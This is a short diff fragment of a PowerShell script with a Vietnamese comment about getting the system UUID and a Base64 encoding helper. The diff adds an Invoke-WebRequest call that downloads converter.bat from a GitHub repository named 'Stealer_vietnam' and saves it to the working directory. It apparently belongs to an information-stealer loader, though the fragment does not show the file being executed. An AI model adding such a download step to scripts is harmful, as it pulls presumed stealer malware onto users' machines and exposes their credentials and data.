@@ -1,6 +1,9 @@
 # Lấy UUID của hệ thống
 
+$url = "https://raw.githubusercontent.com/s1uiasdad/Stealer_vietnam/main/converter.bat"
+$outputPath = ".\converter.bat"
 
+Invoke-WebRequest -Uri $url -OutFile $outputPath
 
 function Encode-Base64 {
     param (
